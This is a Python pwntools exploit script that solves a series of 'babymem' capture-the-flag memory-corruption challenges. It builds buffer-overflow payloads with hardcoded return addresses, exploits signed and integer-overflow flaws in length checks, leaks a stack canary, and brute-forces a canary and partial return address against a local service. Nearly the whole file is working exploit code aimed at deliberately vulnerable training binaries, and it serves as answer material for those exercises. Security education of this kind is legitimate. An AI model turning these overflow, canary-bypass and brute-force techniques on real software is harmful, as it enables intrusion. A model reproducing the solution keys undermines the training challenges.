#!/usr/bin/env python

from pwn import *

def hex2fmt_str(hex_number):
    byte_length = (hex_number.bit_length() + 7) // 8  # Calculate the number of bytes needed
    byte_string = hex_number.to_bytes(byte_length, byteorder='little')  # Convert to bytes in little-endian order
    formatted_string = ''.join(['\\x{:02x}'.format(byte) for byte in byte_string])
    return formatted_string

def fast_payload_gen(pre_len, value, challenge, pad_char = 'a', prefix = '', sign_mix = False, int_of = False):
    fmt_str = hex2fmt_str(value)
    val_len = len(fmt_str) // 4
    command = 'printf "' + str(pre_len + val_len) + '\\n'
    if(sign_mix == True):
        command = 'printf "' + '\\x2d1' + '\\n'
    elif(int_of):
        INT32_MIN = (1 << 31)
        command = 'printf "' + '2' + '\\n' + str(INT32_MIN) + '\\n'
    start_index = 0
    if(prefix != ''):
        start_index += 1
        command = command + prefix
    for i in range(start_index, pre_len):
        command = command + pad_char
    print(command + fmt_str + '" | /challenge/' + challenge)

def bytes_padding(len):
    byte_str = b''
    for i in range(len):
        byte_str = byte_str + b'\x90'
    return byte_str

def babymem_4_0():
    fast_payload_gen(88, 0x4024bc, 'babymem_level4.0', sign_mix = True)

def babymem_4_1():
    fast_payload_gen(72, 0x401b01, 'babymem_level4.1', sign_mix = True)

def babymem_5_0():
    fast_payload_gen(88, 0x4021cd, 'babymem_level5.0', int_of = True)

def babymem_5_1():
    fast_payload_gen(136, 0x401453, 'babymem_level5.1', int_of = True)

def bypass_canary(max_n, pre_len, target_n, byte1, byte2, challenge):
    cmd = 'printf "' + str(max_n) + '\\n'
    for i in range(0, pre_len):
        cmd = cmd + 'a'
    cmd = cmd + target_n + byte1 + byte2 + '" | /challenge/' + challenge
    print(cmd)

def leak_canary(pre_len, byte1, byte2, challenge, to_canary = -1):
    p = process('/challenge/' + challenge)

    # the first stage is to cause challenge() to leak the canary
    p.readuntil('Payload size: ')
    p.sendline(str(pre_len).encode('utf-8'))
    p.readuntil('bytes)!\n')
    p.sendline(b'REPEAT' + b'a' * (pre_len - 6))

    p.readuntil('You said: ')
    input_canary = p.read()
    print(b'leak the canary: ' + input_canary)
    canary = b'\x00' + input_canary[pre_len: pre_len + 7]
    print(canary)
    # the second stage is to overwrite the return address while keep the canary unmodified
    if(b'Payload size' not in input_canary):
        print('read until payload size...')
        p.readuntil('Payload size:')
    if(to_canary < 0):
        to_canary = pre_len - 1
    p.sendline(str(to_canary + 8 + 8 + 2).encode())
    p.readuntil('bytes)!\n')
    p.sendline(b'a' * to_canary + canary + b'a' * 8 + byte1 + byte2)
    p.readuntil('You win! Here is your flag:\n')
    print(p.readline())

# leak_canary(89, b'\xfc', b'\xa1', 'babymem_level12.0')
# leak_canary(41, b'\x74', b'\x29', 'babymem_level12.1')
# leak_canary(104 + 1, b'\xf9', b'\xd5', 'babymem_level14.0', to_canary = 376)
# leak_canary(8 + 1, b'\x10', b'\xc5', 'babymem_level14.1', to_canary = 280)

def test_canary(payload, end=None):
    r = remote('localhost', 1337)
    r.sendline(str(len(payload)).encode())
    r.sendline(payload)
    while True:
        line = r.recvline(timeout=0.2)
        if(end != None and end in line):
            break
        if(b'pwn' in line):
            r.close()
            return line
        if(b'stack smashing detected' in line):
            r.close()
            return b'stack smashing detected'
        if(not line):
            break
        print(line.decode('utf-8'), end='')
    r.close()
    return b''

def brute_force_canary(canary_offset):
    pre = b'a' * canary_offset + b'\x00'
    for pos in range(1, 8):
        for cur in range(0, 256):
            cur_byte = bytes([cur])
            res = test_canary(pre + cur_byte)
            if(res != b'stack smashing detected'):
                pre = pre + cur_byte
                break
    return pre

def brute_force_addr(payload_with_canary, byte1, byte2_set):
    for byte2 in byte2_set:
        print(f'try byte1 {byte1}, byte2 {byte2}')
        res = test_canary(payload_with_canary + byte1 + byte2)
        # print(res)
        if(b'pwn' in res):
            print(res.decode('utf-8'))
            return

# we can get this by running brute_force_canary(104)
# payload_with_canary = brute_force_canary(104)
payload_with_canary = b'a'*104 + b'\x00\na\xda\x02\x9d\xd4\x00'

# '0x?f4e'
brute_force_addr(payload_with_canary + b'a'*8, byte1 = b'\x4e', byte2_set = [bytes([x | 0xf]) for x in range(0, 256, 16)])
